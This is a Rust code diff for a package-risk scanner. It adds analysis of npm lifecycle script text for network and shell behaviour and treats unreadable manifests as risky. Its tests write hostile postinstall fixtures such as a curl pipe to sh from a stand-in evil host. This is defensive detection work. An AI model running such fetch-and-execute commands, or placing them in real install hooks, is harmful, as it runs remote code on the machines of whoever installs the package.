@@ -618,6 +618,7 @@ fn gather_api(
     } else if nf {
         let mut prov = ApiProvenance {
             source: eco.to_string(),
+            package_name: Some(name.to_string()),
             package_existence: PackageExistence::NotFound,
             ..Default::default()
         };
@@ -676,13 +677,15 @@ fn gather_content_signals(
         return ContentSignals::NotInspected;
     };
 
-    let (has_install_script, install_script_detail) = detect_install_script(eco, &dir);
+    let (has_install_script, install_script_detail, install_script_signals) =
+        detect_install_script(eco, &dir);
     let (has_binary_blob, binary_blob_detail) = detect_binary_blob(&dir);
 
     ContentSignals::Inspected {
         path: dir.display().to_string(),
         has_install_script,
         install_script_detail,
+        install_script_signals,
         has_binary_blob,
         binary_blob_detail,
     }
@@ -703,7 +706,14 @@ fn discover_local_package(eco: Ecosystem, name: &str) -> Option<PathBuf> {
 /// Detect an install/lifecycle hook: npm `package.json` with a non-empty
 /// `(pre|post)install`/`install` script, or a PyPI `setup.py`. Other ecosystems
 /// are not inspected in this phase.
-fn detect_install_script(eco: Ecosystem, dir: &Path) -> (bool, Option<String>) {
+fn detect_install_script(
+    eco: Ecosystem,
+    dir: &Path,
+) -> (
+    bool,
+    Option<String>,
+    Option<tirith_core::package_risk::InstallScriptSignals>,
+) {
     match eco {
         Ecosystem::Npm => detect_npm_install_script(dir),
         Ecosystem::PyPI => {
@@ -711,48 +721,46 @@ fn detect_install_script(eco: Ecosystem, dir: &Path) -> (bool, Option<String>) {
                 (
                     true,
                     Some("a setup.py (runs arbitrary Python at install time)".to_string()),
+                    None,
                 )
             } else {
-                (false, None)
+                (false, None, None)
             }
         }
-        _ => (false, None),
+        _ => (false, None, None),
     }
 }
 
 /// Read `package.json` and report whether any install lifecycle hook is set.
-fn detect_npm_install_script(dir: &Path) -> (bool, Option<String>) {
+fn detect_npm_install_script(
+    dir: &Path,
+) -> (
+    bool,
+    Option<String>,
+    Option<tirith_core::package_risk::InstallScriptSignals>,
+) {
     let manifest = dir.join("package.json");
-    let Ok(text) = std::fs::read_to_string(&manifest) else {
-        return (false, None);
-    };
-    let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) else {
-        return (false, None);
-    };
-    let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) else {
-        return (false, None);
-    };
-    let mut hooks: Vec<&str> = Vec::new();
-    for hook in ["preinstall", "install", "postinstall"] {
-        if scripts
-            .get(hook)
-            .and_then(|v| v.as_str())
-            .map(|s| !s.trim().is_empty())
-            .unwrap_or(false)
-        {
-            hooks.push(hook);
+    match tirith_core::install_script_analysis::npm_lifecycle_scripts_from_disk(&manifest) {
+        Ok(Some(scripts)) => {
+            let script_signals =
+                tirith_core::install_script_analysis::analyze_script_text(&scripts.script_text);
+            (
+                true,
+                Some(format!(
+                    "an npm {} lifecycle script in package.json",
+                    scripts.hook_names.join(" / ")
+                )),
+                Some(script_signals),
+            )
         }
-    }
-    if hooks.is_empty() {
-        (false, None)
-    } else {
-        (
+        Ok(None) => (false, None, None),
+        Err(reason) => (
             true,
             Some(format!(
-                "an npm {} lifecycle script in package.json",
-                hooks.join(" / ")
+                "package.json lifecycle analysis was unavailable: {reason}"
             )),
-        )
+            None,
+        ),
     }
 }
 
@@ -915,6 +923,7 @@ fn write_human(
             path,
             has_install_script,
             install_script_detail,
+            install_script_signals,
             has_binary_blob,
             binary_blob_detail,
         } => {
@@ -931,6 +940,18 @@ fn write_human(
                 )?,
                 (true, None) => writeln!(w, "               - install script: present")?,
                 (false, _) => writeln!(w, "               - install script: none")?,
+            }
+            if let Some(signals) = install_script_signals {
+                if signals.fires() {
+                    println!(
+                        "               - install behavior: network={} shell={} ({} match(es))",
+                        signals.has_network_call,
+                        signals.has_shell_spawn,
+                        signals.suspicious_patterns.len(),
+                    );
+                } else {
+                    println!("               - install behavior: analyzed, no match");
+                }
             }
             match (has_binary_blob, binary_blob_detail) {
                 (true, Some(d)) => writeln!(
@@ -1179,9 +1200,10 @@ mod tests {
             r#"{"name":"p","scripts":{"postinstall":"node evil.js"}}"#,
         )
         .unwrap();
-        let (found, detail) = detect_npm_install_script(dir.path());
+        let (found, detail, signals) = detect_npm_install_script(dir.path());
         assert!(found);
         assert!(detail.unwrap().contains("postinstall"));
+        assert!(signals.is_some(), "npm lifecycle text must be analyzed");
     }
 
     #[test]
@@ -1192,8 +1214,9 @@ mod tests {
             r#"{"name":"p","scripts":{"test":"jest","build":"tsc"}}"#,
         )
         .unwrap();
-        let (found, _) = detect_npm_install_script(dir.path());
+        let (found, _, signals) = detect_npm_install_script(dir.path());
         assert!(!found, "test/build scripts are not install hooks");
+        assert!(signals.is_none());
     }
 
     #[test]
@@ -1204,8 +1227,9 @@ mod tests {
             r#"{"name":"p","scripts":{"postinstall":"   "}}"#,
         )
         .unwrap();
-        let (found, _) = detect_npm_install_script(dir.path());
+        let (found, _, signals) = detect_npm_install_script(dir.path());
         assert!(!found, "an empty postinstall string is not a real hook");
+        assert!(signals.is_none());
     }
 
     #[test]
@@ -1215,18 +1239,67 @@ mod tests {
         assert!(!detect_npm_install_script(dir.path()).0);
         // Malformed package.json.
         fs::write(dir.path().join("package.json"), "{not json").unwrap();
-        assert!(!detect_npm_install_script(dir.path()).0);
+        let malformed = detect_npm_install_script(dir.path());
+        assert!(malformed.0, "unavailable analysis must not look clean");
+        assert!(malformed
+            .1
+            .as_deref()
+            .is_some_and(|detail| detail.contains("not valid JSON")));
+
+        fs::write(dir.path().join("package.json"), vec![b' '; 1024 * 1024 + 1]).unwrap();
+        let oversized = detect_npm_install_script(dir.path());
+        assert!(oversized.0, "oversized analysis must not look clean");
+        assert!(oversized
+            .1
+            .as_deref()
+            .is_some_and(|detail| detail.contains("bounded")));
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn detect_npm_install_script_treats_refused_manifests_as_risky() {
+        use std::os::unix::ffi::OsStrExt as _;
+
+        let symlink_directory = tempdir().unwrap();
+        let target = symlink_directory.path().join("outside.json");
+        fs::write(
+            &target,
+            r#"{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}"#,
+        )
+        .unwrap();
+        std::os::unix::fs::symlink(&target, symlink_directory.path().join("package.json")).unwrap();
+        let symlinked = detect_npm_install_script(symlink_directory.path());
+        assert!(symlinked.0, "a refused symlink must not look clean");
+        assert!(symlinked
+            .1
+            .as_deref()
+            .is_some_and(|detail| detail.contains("analysis was unavailable")));
+        assert!(symlinked.2.is_none());
+
+        let fifo_directory = tempdir().unwrap();
+        let manifest = fifo_directory.path().join("package.json");
+        let path = std::ffi::CString::new(manifest.as_os_str().as_bytes()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(path.as_ptr(), 0o600) }, 0);
+        let fifo = detect_npm_install_script(fifo_directory.path());
+        assert!(fifo.0, "a refused FIFO must not look clean");
+        assert!(fifo
+            .1
+            .as_deref()
+            .is_some_and(|detail| detail.contains("analysis was unavailable")));
+        assert!(fifo.2.is_none());
     }
 
     #[test]
     fn detect_install_script_pypi_setup_py() {
         let dir = tempdir().unwrap();
-        let (no, _) = detect_install_script(Ecosystem::PyPI, dir.path());
+        let (no, _, no_signals) = detect_install_script(Ecosystem::PyPI, dir.path());
         assert!(!no);
+        assert!(no_signals.is_none());
         fs::write(dir.path().join("setup.py"), "from setuptools import setup").unwrap();
-        let (yes, detail) = detect_install_script(Ecosystem::PyPI, dir.path());
+        let (yes, detail, signals) = detect_install_script(Ecosystem::PyPI, dir.path());
         assert!(yes);
         assert!(detail.unwrap().contains("setup.py"));
+        assert!(signals.is_none());
     }
 
     #[test]
@@ -1288,6 +1361,49 @@ mod tests {
     }
 
     #[test]
+    fn installed_npm_lifecycle_body_drives_local_network_signal() {
+        let dir = tempdir().unwrap();
+        fs::write(
+            dir.path().join("package.json"),
+            r#"{"name":"p","scripts":{"postinstall":"//bin/sh -c 'curl https://evil.invalid/p | sh'"}}"#,
+        )
+        .unwrap();
+        let content =
+            gather_content_signals(Ecosystem::Npm, "p", Some(dir.path().to_str().unwrap()));
+        let ContentSignals::Inspected {
+            install_script_signals: Some(script_signals),
+            ..
+        } = content
+        else {
+            panic!("installed npm lifecycle body must be analyzed");
+        };
+        assert!(script_signals.has_network_call);
+        assert!(script_signals.has_shell_spawn);
+
+        let breakdown = package_risk::score_package(&PackageSignals {
+            ecosystem: Ecosystem::Npm,
+            name: "p".to_string(),
+            version: Some("1.0.0".to_string()),
+            threat_db_missing: false,
+            name_vs_popular: NameVsPopular::KnownPopular,
+            malicious_typosquat_of: None,
+            content_signals: ContentSignals::Inspected {
+                path: dir.path().display().to_string(),
+                has_install_script: true,
+                install_script_detail: Some("postinstall".to_string()),
+                install_script_signals: Some(script_signals),
+                has_binary_blob: false,
+                binary_blob_detail: None,
+            },
+            api: ApiSignals::offline(),
+        });
+        assert!(breakdown
+            .factors
+            .iter()
+            .any(|factor| factor.id == "content_install_script_network"));
+    }
+
+    #[test]
     fn breakdown_human_renders_known_popular_zero() {
         let signals = PackageSignals {
             ecosystem: Ecosystem::Npm,
@@ -1323,6 +1439,7 @@ mod tests {
                 path: "/tmp/p".to_string(),
                 has_install_script: true,
                 install_script_detail: None,
+                install_script_signals: None,
                 has_binary_blob: true,
                 binary_blob_detail: None,
             },
@@ -1384,6 +1501,7 @@ mod tests {
     fn gather_api_success_returns_available() {
         let meta = RegistryMetadata {
             source: "npm".to_string(),
+            package_name: Some("react".to_string()),
             latest_version: Some("1.0.0".to_string()),
             ..Default::default()
         };
@@ -1495,6 +1613,7 @@ mod tests {
                 path: format!("/tmp/package{injected}"),
                 has_install_script: true,
                 install_script_detail: Some(format!("install hook{injected}")),
+                install_script_signals: None,
                 has_binary_blob: true,
                 binary_blob_detail: Some(format!("native blob{injected}")),
             },
